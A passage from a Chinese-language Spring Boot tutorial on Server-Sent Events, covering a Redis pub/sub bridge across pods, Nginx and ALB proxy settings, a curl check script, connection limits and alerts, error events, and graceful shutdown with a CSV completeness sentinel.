 *     → 有就送出
 * </pre>
 *
 * <p>★ 三個關鍵設計：
 * <ol>
 *   <li><b>發布在 AFTER_COMMIT</b> —— 交易還沒提交就發布的話，
 *       其他 pod 收到通知後去查資料庫會查到舊資料
 *       （05-service 第 06 章的經典問題）。</li>
 *   <li><b>Redis 只傳「有這件事」的通知，不傳完整資料</b> ——
 *       或傳完整資料但<b>資料的真相仍在資料庫</b>。
 *       Redis pub/sub 是 fire-and-forget（沒有持久化、沒有重送），
 *       所以絕不能當唯一通路。</li>
 *   <li><b>訂閱者不重試</b> —— 送不出去就算了，
 *       因為客戶端重連時會用 {@code Last-Event-ID} 補送（5.11.5）。</li>
 * </ol>
 */
@Component
public class SseRedisBridge implements MessageListener {

    private static final Logger log = LoggerFactory.getLogger(SseRedisBridge.class);

    public static final String CHANNEL = "shop:order-events";

    private final SseEmitterRegistry registry;
    private final StringRedisTemplate redis;
    private final ObjectMapper objectMapper;

    public SseRedisBridge(SseEmitterRegistry registry, StringRedisTemplate redis,
                          ObjectMapper objectMapper) {
        this.registry = registry;
        this.redis = redis;
        this.objectMapper = objectMapper;
    }

    /** 發布端（在 AFTER_COMMIT 的 listener 裡呼叫）。 */
    public void publish(OrderEventMessage message) {
        try {
            redis.convertAndSend(CHANNEL, objectMapper.writeValueAsString(message));
        } catch (Exception e) {
            // ★ 發布失敗不能讓業務失敗 —— 事件已經在資料庫裡了，
            //   客戶端下次重連就會補到。
            log.warn("SSE 事件發布失敗 orderId={} sequence={}",
                     message.orderId(), message.sequence(), e);
        }
    }

    /** 訂閱端（每個 pod 都會收到）。 */
    @Override
    public void onMessage(org.springframework.data.redis.connection.Message message,
                         byte[] pattern) {
        OrderEventMessage event;
        try {
            event = objectMapper.readValue(message.getBody(), OrderEventMessage.class);
        } catch (Exception e) {
            log.warn("無法解析 SSE 事件訊息", e);
            return;
        }

        var subscriptions = registry.forOrder(event.orderId());
        if (subscriptions.isEmpty()) {
            return;                       // ★ 這個 pod 沒有相關連線 —— 正常情況
        }

        for (var subscription : subscriptions) {
            try {
                subscription.emitter().send(SseEmitter.event()
                        .id(OrderEventReplayService.formatEventId(event.sequence()))
                        .name(event.type())
                        .data(event.payload()));
            } catch (Exception e) {
                // ★ 不重試（見類別 javadoc 的第 3 點）
                log.debug("SSE 事件送出失敗 subscriptionId={} reason={}",
                          subscription.subscriptionId(), e.getMessage());
                try {
                    subscription.emitter().completeWithError(e);
                } catch (Exception ignored) { }
            }
        }
    }

    /**
     * @param payload 已經是「可以直接序列化給客戶端」的物件
     *                （⚠️ 絕不可以是 Entity —— 那會洩漏內部欄位，03-rest-api 3.2）
     */
    public record OrderEventMessage(String orderId, long sequence,
                                    String type, Object payload) {}
}
```

**四種跨實例方案的對照**：

| 方案 | 送達保證 | 額外基礎設施 | 適用 |
|---|---|---|---|
| **Redis pub/sub** | fire-and-forget | Redis（通常已經有） | ✅ shop-service 的選擇（有 `Last-Event-ID` 補送當後盾） |
| Redis Stream | 有（可重播） | Redis | 事件不能漏，而且不想依賴資料庫補送 |
| Kafka | 有（可重播、有分區） | Kafka | 事件量大（每秒上萬）、需要跨系統 |
| **Sticky session** | N/A | LB 設定 | 🔴 不推薦：pod 重啟 = 所有連線的使用者受影響，而且擴容不均 |

### 5.11.7 為什麼 SSE 在 Nginx 後面不會動（事故 5.2.4 的解決）

**三個問題與各自的解法**：

```nginx
# nginx.conf
http {
    # ── 全站設定 ──────────────────────────────────────────────
    # ★ HTTP/2 解決 5.11.1 的「同網域 6 條連線」限制
    #   （需要 TLS；listen 443 ssl http2;）

    server {
        listen 443 ssl;
        http2 on;                          # Nginx 1.25.1+ 的寫法
        server_name api.shop.example;

        # ── 一般 API ─────────────────────────────────────────
        location / {
            proxy_pass http://shop-service;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_read_timeout 60s;
        }

        # ── SSE 端點（★ 必須單獨設定）─────────────────────────
        location ~ ^/orders/[^/]+/events$ {
            proxy_pass http://shop-service;
            proxy_http_version 1.1;         # ★ 必須 1.1（1.0 不支援 chunked）

            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            # ★ 必須傳遞 Last-Event-ID（Nginx 預設會傳所有 header，
            #   但如果你有 proxy_set_header 的白名單清單，別漏了它）
            proxy_set_header Connection '';  # ★ 清掉 Connection: close

            # ── 問題 1：緩衝 ★★ ─────────────────────────────
            # 預設 proxy_buffering on → Nginx 會湊滿 buffer 才轉給客戶端
            # 症狀：事件被「攢起來」，一次吐 47 筆（事故 5.2.4）
            proxy_buffering off;
            # ⚠️ gzip 也會緩衝！SSE 一定要關
            gzip off;

            # ── 問題 2：逾時 ★★ ─────────────────────────────
            # 預設 60s：60 秒沒有資料就斷線
            # 有心跳（20 秒）的話 60s 也夠，但把它設大讓「心跳掉一次」也不會斷
            proxy_read_timeout 3600s;
            proxy_send_timeout 3600s;

            # ── 問題 3：快取 ────────────────────────────────
            proxy_cache off;

            # ★ 讓 Nginx 不要在後端斷線時自己重試（那會產生重複的訂閱）
            proxy_next_upstream off;
        }
    }
}
```

⚠️ **`location ~ ^/orders/[^/]+/events$` 用 regex 是必要的**，
因為路徑中間有變數（orderId）。

⚠️ **但依賴「維運記得設定 Nginx」是脆弱的。** 應用層要能自救：

```java
    /**
     * SSE 的回應標頭 —— 應用層的自救。
     *
     * <p>★ {@code X-Accel-Buffering: no} 是 Nginx 專屬的標頭：
     * 它會讓 Nginx <b>對這個回應</b>關閉緩衝，
     * <b>即使 nginx.conf 裡沒有 proxy_buffering off</b>。
     *
     * <p>這是「應用程式告訴代理該怎麼做」的少數有效手段，
     * 也是 SSE 最重要的一個標頭。
     * （其他代理有各自的機制：Envoy 看 content-type，
     * Cloudflare 對 text/event-stream 自動不緩衝。）
     */
    private static void applySseHeaders(HttpServletResponse response) {
        response.setContentType("text/event-stream;charset=UTF-8");
        // ★ Nginx / 部分 CDN：關閉緩衝
        response.setHeader("X-Accel-Buffering", "no");
        // ★ 不快取（SSE 被快取的話客戶端會拿到舊的事件流）
        response.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
        response.setHeader("Pragma", "no-cache");
        // ★ 明確要求 keep-alive
        response.setHeader("Connection", "keep-alive");
        // ⚠️ Content-Encoding 一定不能是 gzip —— 見下面的設定
    }
```

**在 Spring 這邊要關掉對 SSE 的壓縮**：

```yaml
server:
  compression:
    enabled: true
    # ★ text/event-stream 刻意不在清單裡 ——
    #   壓縮需要緩衝，會讓事件延遲到 buffer 滿才送出
    mime-types: application/json,application/problem+json,text/csv,application/xml
    min-response-size: 2048
```

⚠️ **`text/csv` 在清單裡而 `text/event-stream` 不在**，是刻意的：
CSV 匯出是「一次性的大檔案」，壓縮省下 70% 的頻寬且延遲不重要；
SSE 是「即時的小事件」，延遲比頻寬重要得多。

**AWS ALB 的設定**（很多人漏掉）：

```
Target Group 的屬性：
  · Deregistration delay: 300s（部署時等連線結束）

Load Balancer 的屬性：
  · Idle timeout: 3600s        ★ 預設 60s —— 必須改
  ⚠️ 這是 LB 層級的設定，會影響「所有」端點。
     如果你不想讓一般 API 的 idle timeout 也變成一小時，
     就需要一個獨立的 LB / listener rule 給 SSE。
```

**一個可以立刻驗證的檢查腳本**：

```bash
#!/usr/bin/env bash
# sse-check.sh —— 驗證 SSE 在正式環境是否正常
#
# ★ 這個腳本要在「經過所有代理」的環境跑（不是 localhost:8080）
set -euo pipefail

URL="${1:?用法: sse-check.sh https://api.shop.example/orders/ord_1/events}"
TOKEN="${SHOP_TOKEN:?請設定 SHOP_TOKEN}"

echo "=== 檢查 1：回應標頭 ==="
curl -sS -D - -o /dev/null --max-time 5 -N \
     -H "Authorization: Bearer $TOKEN" \
     -H "Accept: text/event-stream" "$URL" | grep -iE \
     'HTTP/|content-type|cache-control|x-accel-buffering|content-encoding|transfer-encoding' \
  || true

echo
echo "=== 檢查 2：第一個 byte 的延遲（應該 < 1 秒）==="
# ★ 如果這個數字接近 proxy_buffer 的大小/頻寬，代表緩衝沒關掉
curl -sS -o /dev/null -N --max-time 10 \
     -w 'time_starttransfer: %{time_starttransfer}s\n' \
     -H "Authorization: Bearer $TOKEN" \
     -H "Accept: text/event-stream" "$URL" || true

echo
echo "=== 檢查 3：心跳（觀察 70 秒，應該看到至少 3 個 heartbeat）==="
# ★ 70 秒是刻意的：它跨過了「60 秒 idle timeout」這條線。
#   如果連線在 60 秒左右斷掉，就是逾時設定沒改。
timeout 70 curl -sS -N \
     -H "Authorization: Bearer $TOKEN" \
     -H "Accept: text/event-stream" "$URL" \
  | while IFS= read -r line; do
      printf '[%s] %s\n' "$(date +%H:%M:%S)" "$line"
    done || true

echo
echo "=== 判讀 ==="
cat <<'EOF'
✅ 正常：
   · content-type: text/event-stream
   · x-accel-buffering: no
   · 沒有 content-encoding: gzip
   · time_starttransfer < 1s
   · 每 20 秒看到一行 ": heartbeat ..."
   · 70 秒後連線還在

🔴 症狀 → 原因：
   · 前 60 秒完全沒輸出，然後一次吐出來
     → Nginx proxy_buffering 沒關（或 gzip 沒關）
   · 剛好 60 秒斷線
     → proxy_read_timeout / ALB idle timeout 是 60s
   · 完全沒有 heartbeat
     → @Scheduled 沒生效（漏了 @EnableScheduling），
       或 scheduler 的單一執行緒被別的任務卡住（5.11.4）
   · content-encoding: gzip
     → server.compression.mime-types 含 text/event-stream
EOF
```

### 5.11.8 執行緒與連線的成本

**SSE 不佔用 Tomcat 的工作執行緒**（它是 async），**但佔用連線**：

```
server:
  tomcat:
    threads:
      max: 200                  # 工作執行緒
    max-connections: 8192       # ★ 同時開啟的連線數上限
    accept-count: 100
```

| 資源 | 5000 條 SSE 連線的成本 |
|---|---|
| Tomcat 工作執行緒 | **0**（連線閒置時完全不佔） |
| Tomcat connection slot | **5000 / 8192**（⚠️ 只剩 3192 給正常請求） |
| Socket / file descriptor | 5000（⚠️ 檢查 `ulimit -n`，容器預設常常是 1024） |
| `SseEmitter` + registry | 約 5 MB |
| 心跳的 CPU | 每秒 250 次 `send()`，約 1% 的一核 |
| **每次心跳的網路** | 5000 × 約 40 bytes ÷ 20 秒 = 10 KB/s |

⚠️ **`max-connections: 8192` 是最容易撞到的天花板**，
而症狀是**「新的請求完全連不上，但 CPU 與記憶體都很閒」**。

**必要的設定與監控**：

```yaml
server:
  tomcat:
    max-connections: 20000        # ★ 為 SSE 調高
    threads:
      max: 200                    # 工作執行緒不用調（SSE 不佔）
    connection-timeout: 20s       # ⚠️ 這是「等第一個 byte」的逾時，不影響已建立的 SSE

management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics,prometheus
```

```dockerfile
# ⚠️ 容器的 fd 上限
# 沒有這一行，5000 條連線會撞到預設的 1024
# （症狀：java.io.IOException: Too many open files）
RUN echo "* soft nofile 65536" >> /etc/security/limits.conf
```

```yaml
# Kubernetes 的等價設定
spec:
  containers:
    - name: shop-service
      # ⚠️ K8s 沒有直接設 ulimit 的欄位 ——
      #    需要在 container image 裡設，或用 initContainer + privileged。
      #    多數容器 runtime 的預設 nofile 已經是 1048576（比較新的 containerd），
      #    但一定要實測：kubectl exec -- sh -c 'ulimit -n'
```

**告警規則**：

```yaml
# prometheus/rules/shop-api-sse.yml
groups:
  - name: shop-api-sse
    rules:
      # ★ 連線數只增不減 = 洩漏（onCompletion 沒被呼叫，或 registry 沒清理）
      - alert: SseConnectionLeak
        expr: |
          shop_sse_connections > 1000
          and
          deriv(shop_sse_connections[30m]) > 0
        for: 30m
        labels:
          severity: warning
        annotations:
          summary: "SSE 連線數持續上升，可能有洩漏"
          description: "目前 {{ $value }} 條。檢查 onCompletion 是否被呼叫。"

      - alert: SseConnectionsNearLimit
        expr: shop_sse_connections / shop_sse_connections_max > 0.8   # ★ 用比例，不用寫死 4000
        for: 5m
        labels:
          severity: critical

      # ★ Tomcat 的連線快滿了 —— 這會讓「所有」端點掛掉
      - alert: TomcatConnectionsNearLimit
        expr: |
          tomcat_connections_current
            / on() tomcat_connections_max > 0.8
        for: 5m
        labels:
          severity: critical
          
      # ★ 重連率過高 = 心跳或代理設定有問題（5.11.4）
      - alert: SseReconnectStorm
        expr: rate(shop_sse_connections_opened_total[5m]) > 20
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "SSE 每秒新增超過 20 條連線 —— 可能是連線一直被回收"
```

### 5.11.9 SSE 的錯誤處理：三個進不了 advice 的情況 ★

**這是 03 章 3.3.5「哪些例外進不了 advice」在 SSE 上的答案。**

```
① 授權失敗（在回傳 emitter 之前拋例外）
   → ✅ 進得了 advice → 403 Problem JSON
   ⚠️ 但 EventSource 收到 403 之後會 close()，並觸發 onerror，
      而 JavaScript 拿不到回應 body！
      → 前端只知道「連不上」，不知道為什麼

② send() 拋 IOException（回傳 emitter 之後）
   → 🔴 進不了 advice（回應已 committed）
   → 只能走 onError 回呼

③ 業務邏輯在事件產生時失敗
   → 🔴 進不了 advice（那是背景執行緒）
   → 只能送一個 event: error 給客戶端
```

⚠️ **① 的問題是 SSE 的一個根本限制**：

```javascript
const source = new EventSource('/orders/ord_1/events');
source.onerror = (e) => {
  // 🔴 e 裡面「沒有」狀態碼，也「沒有」回應 body
  //    你完全不知道是 403、404、503 還是網路斷線
  console.log(e);          // → Event { type: "error", ... } 就這樣
};
```

**三個解法**：

| 解法 | 說明 |
|---|---|
| **前端先打一次一般的 GET** ★ | `GET /orders/{id}` 成功了才開 SSE。授權問題會在那次請求裡以正常的 Problem JSON 回報。**這也正好是 5.11.5 的「快照 + 增量」架構** |
| 用 `fetch` + `ReadableStream` 取代 `EventSource` | 可以讀狀態碼與 body，也可以帶 `Authorization` header。⚠️ 但要自己實作重連與 `Last-Event-ID` |
| 一律回 200，把錯誤放在第一個事件裡 | 🔴 不推薦：讓「沒有權限」變成 200，破壞了 HTTP 語意，也讓監控看不到 403 |

**shop-service 用第一個** —— 而它剛好與正確的前端架構重合，所以沒有額外成本。

**② 與 ③ 的處理：`event: error`**

```java
package example.shop.order.service;

import example.shop.common.error.BusinessException;
import example.shop.common.web.TraceContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * SSE 的錯誤傳遞。
 *
 * <p>★ 回應已經是 {@code 200 + text/event-stream} 之後，
 * 唯一能告訴客戶端「出事了」的方式就是<b>送一個事件</b>。
 *
 * <p>格式刻意與 {@code Problem}（03 章 3.6.2）的關鍵欄位對齊，
 * 讓前端可以用同一套元件顯示 ——
 * 這和 5.10.5 的 {@code OrderExportResponse.Error} 是同一個決定。
 */
public final class SseErrors {

    private static final Logger log = LoggerFactory.getLogger(SseErrors.class);

    /**
     * 送一個錯誤事件，然後結束串流。
     *
     * <p>★ 為什麼要「結束」而不是「繼續」：
     * 如果錯誤是暫時的（資料庫抖動），客戶端重連會恢復；
     * 如果是永久的（訂單被刪除），客戶端會收到 404 而停止重連。
     * <b>結束連線讓瀏覽器的自動重連機制去處理，比我們自己重試簡單得多。</b>
     */
    public static void sendAndComplete(SseEmitter emitter, BusinessException ex) {
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("code", ex.errorCode().name());
        payload.put("retryable", ex.errorCode().retryable());
        payload.put("traceId", TraceContext.current());
        // ⚠️ 不放 ex.getMessage()（那是英文技術訊息，可能含內部資訊）——
        //    userMessage 應該由 i18n 來（但這裡拿不到 MessageSource，
        //    所以真正的實作要注入 ProblemFactory，見下面的註記）
        payload.put("userMessage", "即時更新中斷，系統會自動重試。");
        ex.extensions().forEach(payload::putIfAbsent);

        try {
            emitter.send(SseEmitter.event().name("error").data(payload));
        } catch (Exception e) {
            log.debug("送出 SSE 錯誤事件失敗（客戶端可能已斷線）", e);
        } finally {
            try {
                emitter.complete();
            } catch (Exception ignored) { }
        }
    }

    /**
     * 送一個「串流正常結束」的事件。
     *
     * <p>★★ 這是 SSE 最容易漏掉的一件事：
     * 直接 {@code complete()} 的話，瀏覽器會認為「連線意外斷了」
     * 並在 3 秒後<b>自動重連</b> —— 而伺服器又會立刻結束它
     * → <b>每 3 秒一次的無限迴圈</b>。
     *
     * <p>送一個 {@code stream.end} 事件讓前端知道要呼叫 {@code source.close()}。
     */
    public static void endNormally(SseEmitter emitter, String reason) {
        try {
            emitter.send(SseEmitter.event()
                    .name("stream.end")
                    .data(Map.of("reason", reason,
                                 "hint", "請呼叫 EventSource.close() 停止重連")));
        } catch (Exception e) {
            log.debug("送出 stream.end 失敗", e);
        } finally {
            try {
                emitter.complete();
            } catch (Exception ignored) { }
        }
    }

    private SseErrors() {}
}
```

⚠️ **「無限重連迴圈」是真的會讓服務掛掉的問題**。算一下：

```
訂單完成後，伺服器結束串流（沒送 stream.end）
  → 瀏覽器 3 秒後重連
  → 伺服器：查授權（1 次 DB）+ 補送檢查（1 次 DB）+ 立刻結束
  → 3 秒後又來

100 個使用者的分頁停在已完成的訂單頁
  → 每秒 33 次連線 × 2 次 DB 查詢 = 每秒 66 次查詢
  → 而且這些連線的 log 會塞滿 Loki

⚠️ 而使用者完全看不出異常（畫面上訂單顯示「已完成」，一切正常）
```

**這個 bug 的偵測方式**：`shop_sse_connections_opened_total` 的 rate
（5.11.8 的 `SseReconnectStorm` 告警）。

**完整的前端配套**：

```javascript
function subscribeToOrder(orderId, onUpdate) {
  const source = new EventSource(`/orders/${orderId}/events`);

  source.addEventListener('order.status.changed', (e) => onUpdate(JSON.parse(e.data)));

  // ★ 必須處理這兩個事件，否則會有無限重連
  source.addEventListener('stream.end', () => {
    source.close();                                  // ★ 停止自動重連
  });
  source.addEventListener('stream.reconnect', (e) => {
    // 伺服器要重啟了。retry: 已經帶了 jitter，什麼都不用做 ——
    // 瀏覽器會依 retry 的值自己重連
    console.debug('server shutting down, will reconnect', JSON.parse(e.data));
  });
  source.addEventListener('error', (e) => {
    // ⚠️ 注意：這個 'error' 是「伺服器送的具名事件」，
    //    和 source.onerror（連線層的錯誤）是兩件不同的事！
    const problem = JSON.parse(e.data);
    if (!problem.retryable) {
      source.close();
      showError(problem.userMessage, problem.traceId);
    }
  });

  return () => source.close();      // 回傳清理函式（React 的 useEffect 用）
}
```

⚠️ **`addEventListener('error', ...)` 與 `source.onerror` 是兩件不同的事** ——
這是 SSE API 設計上一個非常容易搞混的地方：

| | 觸發者 | `e.data` |
|---|---|---|
| `source.onerror` | 瀏覽器（連線層） | ❌ 沒有 |
| `addEventListener('error', …)` | **伺服器送的 `event: error`** | ✅ 有 |

**所以伺服器最好不要用 `error` 當事件名稱** —— 改用 `stream.error`：

```java
            emitter.send(SseEmitter.event().name("stream.error").data(payload));
```

### 5.11.10 關機：把 5.11.6 的 `shutdown()` 放進完整的脈絡 ★★

5.11.6 的 `SseEmitterRegistry` 已經有一個 `@PreDestroy` 的 `shutdown()` ——
它會送 `stream.reconnect` 並用 `reconnectTime` 做抖動。

**這一節回答三個那時候沒說的問題**：

1. **它真的會被呼叫嗎？** —— 答案取決於一個預設值是 `immediate` 的設定。
2. **`@PreDestroy` 的時機夠早嗎？**
3. **進行中的串流匯出怎麼辦？** —— `shutdown()` 完全沒有處理它們。

#### 問題一：`server.shutdown` 預設是 `immediate`

```yaml
server:
  # ★★ 預設是 immediate —— Tomcat 直接關閉所有連線，
  #    而 Spring 的 @PreDestroy 是在那之後才跑的
  shutdown: graceful

spring:
  lifecycle:
    # ★ 等待「進行中的請求」完成的上限（預設 30s）
    timeout-per-shutdown-phase: 45s
```

**沒有這兩行時的時間軸**：

```
14:32:10  SIGTERM
14:32:10  Tomcat 立刻關閉所有連線
          ├─ 2,000 條 SSE          → 客戶端收到 connection reset
          └─ 30 個進行中的 CSV 匯出 → 使用者拿到「下載了一半」的檔案
14:32:10  Spring 才開始銷毀 bean → SseEmitterRegistry.shutdown() 執行
          → ⚠️ 它對著 2,000 條**已經斷掉**的連線送 stream.reconnect
          → 每一條都拋例外、被 catch 掉、什麼也沒發生
```

⚠️ **`shutdown()` 的程式碼完全正確，而且測試會過** ——
它只是**在錯的時間點被呼叫**。
那個 `catch (Exception ignored)` 讓失敗完全靜默。

> **★ 這是一個「設定決定程式碼有沒有意義」的例子。**
> 5.11.6 寫了 20 行來做優雅的重連分散，
> 而少一行 `server.shutdown: graceful` 就讓那 20 行變成純粹的浪費。

**`graceful` 改變了順序**：

```
① 停止接受新連線（Tomcat 的 acceptor 關閉）
② 等待「進行中的請求」完成，最多 timeout-per-shutdown-phase
③ 逾時後才強制關閉
④ 然後才是 Spring 的 bean 銷毀（@PreDestroy）
```

#### 問題二：`@PreDestroy` 在第 ④ 步 —— 太晚了

**看出矛盾了嗎？**

```
② 等待「進行中的請求」完成 ← SSE 連線就是「進行中的請求」
                             它的 timeout 是 30 分鐘（5.11.3）
                             → Tomcat 會等好等滿 45 秒
④ @PreDestroy 才執行        ← 這時候才送 stream.reconnect
```

**結果：每次部署固定慢 45 秒，而那 45 秒完全是浪費的。**

**修法：把關機通知提前到 `ContextClosedEvent`。**

```java
    /**
     * 關閉所有 SSE 連線。
     *
     * <p>★ 為什麼要做：不做的話部署時所有連線會硬斷，
     * 瀏覽器立刻同時重連 → <b>新 pod 剛起來就被 5000 條連線打爆</b>。
     *
     * <p>送一個帶隨機 {@code retry} 的事件，讓重連時間分散（jitter）。
     *
     * <p>⚠️⚠️ 5.11.10 的修正：**觸發點從 {@code @PreDestroy} 改成
     * {@code ContextClosedEvent}**。
     *
     * <p>理由：開了 {@code server.shutdown: graceful} 之後，
     * Tomcat 會先「等待進行中的請求完成」——
     * 而 SSE 連線在它眼中就是進行中的請求，
     * 於是它會等滿 {@code timeout-per-shutdown-phase}（45 秒）才放棄，
     * <b>然後才輪到 {@code @PreDestroy}</b>。
     *
     * <p>{@code ContextClosedEvent} 發生在那個等待<b>之前</b> ——
     * 主動 {@code complete()} 之後那些請求就不再是「進行中」的，
     * Tomcat 立刻就能收工。
     *
     * <p><b>部署時間：45 秒 → 約 1 秒。</b>
     */
    @org.springframework.context.event.EventListener(
            org.springframework.context.event.ContextClosedEvent.class)
    public void shutdown() {
        log.info("關閉所有 SSE 連線 count={}", bySubscription.size());
        var random = new java.util.Random();
        for (var subscription : List.copyOf(bySubscription.values())) {
            try {
                // ★ 1～15 秒的隨機重連間隔 —— 讓 5000 條連線分散在 15 秒內回來
                subscription.emitter().send(SseEmitter.event()
                        .name("stream.reconnect")
                        .reconnectTime(1_000L + random.nextInt(14_000))
                        .data(Map.of("reason", "SERVER_SHUTDOWN")));
                subscription.emitter().complete();
            } catch (Exception ignored) {
                // 已斷線 —— 沒關係
            }
        }
        bySubscription.clear();
        byOrder.clear();
        byActor.clear();
    }
```

⚠️ **只改了註解與那一個註解 —— 方法本體完全沒動。**

**`@PreDestroy` vs `ContextClosedEvent` 的一般規則**：

| 用哪個 | 時機 | 適合 |
|---|---|---|
| `ContextClosedEvent` | **graceful 等待之前** | 需要「主動讓進行中的請求結束」的東西 ★ |
| `@PreDestroy` | bean 銷毀階段（最後） | 釋放資源（關連線池、關檔案） |

> **判準：這個動作會「影響 Tomcat 要等多久」嗎？**
> 會 → `ContextClosedEvent`。不會 → `@PreDestroy`。

#### 問題三：`shutdown()` 完全沒處理串流匯出

**SSE 與串流下載被砍的嚴重程度完全不同**：

| | SSE | 串流下載（5.9） |
|---|---|---|
| 客戶端行為 | `EventSource` **自動重連** | ❌ **沒有自動重連** |
| 使用者感受 | 幾乎無感（`Last-Event-ID` 補送，5.11.5） | **拿到一個損毀的 CSV，而且不知道** |
| 嚴重度 | 低 | ⚠️ **高** —— 5.9.4「串流到一半失敗了」的第四種成因 |

⚠️ **串流下載的損毀是靜默的**：HTTP 200 已經送出、chunked 傳輸沒有
`Content-Length` 可以比對，所以**客戶端無法分辨「傳完了」與「被砍了」**。
使用者會拿一份少了 12 萬筆的報表去對帳。

**第一步：讓串流知道「該收尾了」。**

```java
package example.shop.common.web;

import org.springframework.context.event.ContextClosedEvent;
import org.springframework.context.event.EventListener;
import org.springframework.stereotype.Component;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 讓長時間執行的串流知道「伺服器正在關機」。
 *
 * <p>★ 為什麼需要它：graceful shutdown 只會「等待」，不會「通知」——
 *    進行中的 {@code StreamingResponseBody} 完全不知道自己
 *    再過 45 秒就會被砍。
 */
@Component
public class ShutdownSignal {

    private final AtomicBoolean shuttingDown = new AtomicBoolean(false);

    public boolean isShuttingDown() { return shuttingDown.get(); }

    @EventListener(ContextClosedEvent.class)
    public void onContextClosed() { shuttingDown.set(true); }
}
```

**第二步：在串流的最後寫一行 sentinel。**

```java
/**
 * 5.9.2 的 CSV 匯出，加上「完整性標記」。
 *
 * <p>★★ 核心想法：**在串流的最後寫一行 sentinel**。
 *    客戶端檢查最後一行 —— 沒有它就代表傳輸被中斷了。
 *
 * <p>⚠️ 注意 CsvWriter 是 5.9.2 定義的**靜態工具**
 *    （{@code CsvWriter.header(...)} / {@code CsvWriter.row(...)} 回傳字串），
 *    不是一個有狀態的 writer —— 所以這裡自己管 {@code BufferedWriter}。
 *
 * <p>⚠️⚠️ 而且 {@code header()} / {@code row()} <b>回傳的字串已經含 CRLF 結尾</b>
 *    （5.9.2 的 {@code CsvWriterTest} 斷言 {@code row("a", null, "c")} 等於
 *    {@code "a,,c\r\n"}）—— 所以<b>不要再自己 {@code write('\n')}</b>，
 *    那會讓每一列後面多一個空行，而 Excel 會把它顯示成一筆空白資料列。
 */
@GetMapping(value = "/orders.csv", produces = "text/csv")
public ResponseEntity<StreamingResponseBody> export(OrderFilter filter) {

    StreamingResponseBody body = out -> {
        var writer = new BufferedWriter(
                new OutputStreamWriter(out, StandardCharsets.UTF_8), 8192);
        long rows = 0;
        try {
            // ★ 5.9.2：Excel 的 BOM。
            //   ⚠️ 用常數而不是字面字元 —— U+FEFF 在編輯器裡看不見，
            //     直接貼進原始碼會造成「看不出差異的 diff」（5.9.2 的 UTF8_BOM）。
            writer.write(CsvWriter.UTF8_BOM);
            writer.write(CsvWriter.header(OrderSummaryCsvRowMapper.HEADERS));
            // ★ 不用 write('\n') —— header() 已經含 CRLF

            try (var stream = orderQueryService.stream(filter)) {
                var it = stream.iterator();
                while (it.hasNext()) {
                    // ★ 每 1,000 筆檢查一次「是不是該停了」
                    if (rows % 1000 == 0 && shutdownSignal.isShuttingDown()) {
                        // ⚠️ 刻意**不**寫 sentinel —— 讓客戶端知道這一份是壞的
                        writer.write("# ABORTED: server shutting down at row "
                                + rows + "\r\n");           // ★ 與其餘列一致用 CRLF
                        writer.flush();
                        return;
                    }
                    writer.write(CsvWriter.row(mapper.toRowValues(it.next())));
                    rows++;                       // ★ row() 已經含 CRLF
                    if (rows % 500 == 0) writer.flush();   // ★ 5.9.2：定期沖出
                }
            }
            // ★★ 只有真的跑完才寫 sentinel
            writer.write("# END OF EXPORT rows=" + rows
                    + " generatedAt=" + Instant.now(clock) + "\r\n");
            writer.flush();
        } catch (IOException e) {
            // 5.9.4：客戶端斷線 —— 不是錯誤，不要告警
            if (isClientAbort(e)) {          // ★ 5.9.4 定義的同一個 helper
                log.debug("客戶端中斷匯出，已寫出 {} 筆", rows);
                return;
            }
            throw new UncheckedIOException(e);
        }
    };

    return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("text/csv;charset=UTF-8"))
            .header(HttpHeaders.CONTENT_DISPOSITION,
                    // ★ 5.8.1 的 API 是 build(inline, filename)
                    ContentDispositions.build(false, "訂單匯出.csv"))
            // ★ 明確告訴客戶端「要檢查最後一行」
            .header("X-Export-Sentinel", "# END OF EXPORT")
            .body(body);
}
```

⚠️ **`# END OF EXPORT` 這一行有一個代價**：Excel 會把它當成一筆資料列。

| 方式 | 取捨 |
|---|---|
| **A. 用 `#` 開頭當註解**（上面的做法） | Excel 仍會顯示它。⚠️ 但使用者看到「END OF EXPORT」比看到「少了 12 萬筆」好 |
| B. 改用非同步匯出（5.10） | ✅ **正解** —— 202 + 輪詢，檔案在物件儲存上是原子的 |

> **★ 這正是 5.10 存在的理由**：
> **同步串流永遠有「傳到一半斷掉」的問題，而那無法在 HTTP 層根治。**
> sentinel 是同步串流的**緩解**，不是解法。
>
> shop-service 的 `max-sync-rows: 20000`（5.9.2）就是這條線 ——
> **2 萬筆約 4 秒，在 45 秒的 graceful 期間內一定跑得完。**
> ⚠️ 那個數字不是隨便訂的，它與 `timeout-per-shutdown-phase` 綁在一起。

#### 三個數字必須一起看

```yaml
# Kubernetes
spec:
  # ★★ 必須 > timeout-per-shutdown-phase + preStop 的 sleep
  #    否則 kubelet 會在 Spring 還在等的時候送 SIGKILL
  terminationGracePeriodSeconds: 75
  containers:
    - name: shop-service
      lifecycle:
        preStop:
          exec:
            # ★★ 這個 sleep 是必要的，理由見下方
            command: ["sh", "-c", "sleep 10"]
      readinessProbe:
        httpGet: { path: /actuator/health/readiness, port: 8080 }
        periodSeconds: 2
```

⚠️ **`preStop` 的 `sleep 10` 是最常被漏掉的一環。**

```
沒有它：
  t=0    kubelet 送 SIGTERM
  t=0    Spring 開始 graceful shutdown（停止接受新連線）
  t=0~2  ⚠️ Service 的 endpoints 還沒更新
         → 負載平衡器**還在送新請求過來**
         → 那些請求收到 connection refused → 使用者看到 502

有它：
  t=0    kubelet 送 SIGTERM，同時把 Pod 標記為 Terminating
  t=0    preStop 開始 sleep 10（★ Spring 還沒開始關）
  t=0~2  endpoints 更新，負載平衡器停止送新請求
  t=10   preStop 結束 → Spring 才開始 graceful shutdown
